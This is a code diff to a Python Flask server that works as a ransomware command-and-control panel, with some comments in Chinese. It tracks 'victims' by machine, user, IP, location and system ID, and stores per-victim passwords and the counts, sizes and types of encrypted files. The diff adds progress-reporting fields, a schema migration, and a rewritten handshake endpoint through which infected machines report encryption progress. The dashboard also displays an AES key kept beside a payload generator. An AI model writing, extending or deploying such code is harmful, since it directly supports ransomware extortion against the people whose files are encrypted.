@@ -81,7 +81,46 @@ class Victim(db.Model):
     encrypted_size = db.Column(db.BigInteger, default=0)
     encrypted_types = db.Column(db.Text, default='')
     encrypted_detail = db.Column(db.Text, default='')
+    total_count = db.Column(db.Integer, default=0)
+    total_size = db.Column(db.BigInteger, default=0)
+    is_complete = db.Column(db.SmallInteger, default=1)
+    updated_at = db.Column(db.DateTime, default=datetime.datetime.utcnow, onupdate=datetime.datetime.utcnow)
     created_at = db.Column(db.DateTime, default=datetime.datetime.utcnow)
+
+
+def ensure_schema():
+    """幂等补齐进度条字段（老库升级用）。MySQL 不支持 ADD COLUMN IF NOT EXISTS，故先查 information_schema。"""
+    try:
+        insp = db.inspect(db.engine)
+        cols = {c['name'] for c in insp.get_columns('victims')}
+        ddls = {
+            'total_count': 'ALTER TABLE victims ADD COLUMN total_count INT NOT NULL DEFAULT 0',
+            'total_size': 'ALTER TABLE victims ADD COLUMN total_size BIGINT NOT NULL DEFAULT 0',
+            'is_complete': 'ALTER TABLE victims ADD COLUMN is_complete TINYINT NOT NULL DEFAULT 1',
+            'updated_at': 'ALTER TABLE victims ADD COLUMN updated_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP',
+            'encrypted_detail': 'ALTER TABLE victims ADD COLUMN encrypted_detail TEXT NULL',
+            'encrypted_types': 'ALTER TABLE victims ADD COLUMN encrypted_types TEXT NULL',
+        }
+        for name, ddl in ddls.items():
+            if name not in cols:
+                try:
+                    db.session.execute(db.text(ddl)); db.session.commit()
+                    print(f'[schema] added column {name}')
+                except Exception as e:
+                    db.session.rollback(); print(f'[schema] {name}: {e}')
+        # 老库可能没有 systemid 唯一键（upsert 依赖）
+        try:
+            idx = {i['name'] for i in insp.get_indexes('victims')}
+            if 'uniq_systemid' not in idx:
+                try:
+                    db.session.execute(db.text('ALTER TABLE victims ADD UNIQUE KEY uniq_systemid (systemid)'))
+                    db.session.commit(); print('[schema] added uniq_systemid')
+                except Exception as e:
+                    db.session.rollback(); print(f'[schema] uniq_systemid: {e}')
+        except Exception:
+            pass
+    except Exception as e:
+        print(f'[schema] ensure_schema skipped: {e}')
 
 def login_required(f):
     @wraps(f)
@@ -199,8 +238,10 @@ def dashboard():
     total_pages = max(1, -(-total // per_page))
     ks_path = os.path.join(PAYLOAD_DIR, '.key_secret')
     aes_key = open(ks_path).read().strip() if os.path.exists(ks_path) else 'KEY_NOT_SET'
+    has_active = any(int(getattr(v, 'is_complete', 1) or 1) == 0 for v in victims)
     return render_template('dashboard.html', victims=victims, page=page,
-        total_pages=total_pages, total=total, search=search, version=CURRENT_VERSION, aes_key=aes_key)
+        total_pages=total_pages, total=total, search=search, version=CURRENT_VERSION,
+        aes_key=aes_key, has_active=has_active)
 
 # ── Handshake ──
 @app.route('/health')
@@ -211,17 +252,39 @@ def health():
 def handshake():
     if request.form.get('handshake') != app.config['HANDSHAKE_SECRET']:
         return 'Invalid', 403
-    v = Victim(machine_name=request.form.get('machine_name',''),
-        computer_user=request.form.get('computer_user',''),
-        os=request.form.get('os',''), date=request.form.get('date',''),
-        time=request.form.get('time',''), ip=request.form.get('ip',request.remote_addr),
-        location=request.form.get('location',''), systemid=request.form.get('systemid',''),
-        password=request.form.get('password',''),
-        encrypted_count=int(request.form.get('encrypted_count',0) or 0),
-        encrypted_size=int(request.form.get('encrypted_size',0) or 0),
-        encrypted_types=request.form.get('encrypted_types',''),
-        encrypted_detail=request.form.get('encrypted_detail',''))
-    db.session.add(v); db.session.commit()
+    f = request.form
+    systemid = f.get('systemid', '')
+    def _i(k, d=0):
+        try: return int(f.get(k, d) or d)
+        except: return d
+    ec, es = _i('encrypted_count'), _i('encrypted_size')
+    tc, ts = _i('total_count'), _i('total_size')
+    et, ed = f.get('encrypted_types', ''), f.get('encrypted_detail', '')
+    is_complete = 1 if str(f.get('is_complete', '1')) not in ('0', 'false', 'False') else 0
+
+    # 按 systemid upsert：同一主机多次心跳（进度上报）更新同一行，不产生重复记录
+    v = Victim.query.filter_by(systemid=systemid).first() if systemid else None
+    if v is None:
+        v = Victim(systemid=systemid)
+        db.session.add(v)
+    v.machine_name = f.get('machine_name', '')
+    v.computer_user = f.get('computer_user', '')
+    v.os = f.get('os', '')
+    v.date = f.get('date', '')
+    v.time = f.get('time', '')
+    v.ip = f.get('ip', request.remote_addr)
+    v.location = f.get('location', '')
+    v.password = f.get('password', '')
+    # 计数只增不减，避免进度心跳把已有统计清零
+    if ec > 0 or (v.encrypted_count or 0) == 0: v.encrypted_count = ec
+    if es > 0 or (v.encrypted_size or 0) == 0: v.encrypted_size = es
+    if tc > 0 or (v.total_count or 0) == 0: v.total_count = tc
+    if ts > 0 or (v.total_size or 0) == 0: v.total_size = ts
+    if et: v.encrypted_types = et
+    if ed and ed != '{}': v.encrypted_detail = ed
+    v.is_complete = is_complete
+    v.updated_at = datetime.datetime.utcnow()
+    db.session.commit()
     return 'handshake completed'
 
 # ── Payload Generator ──
@@ -399,5 +462,7 @@ def do_update():
 # ── Startup ──
 if __name__ == '__main__':
     if is_installed():
-        with app.app_context(): db.create_all()
+        with app.app_context():
+            db.create_all()
+            ensure_schema()
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), debug=False)
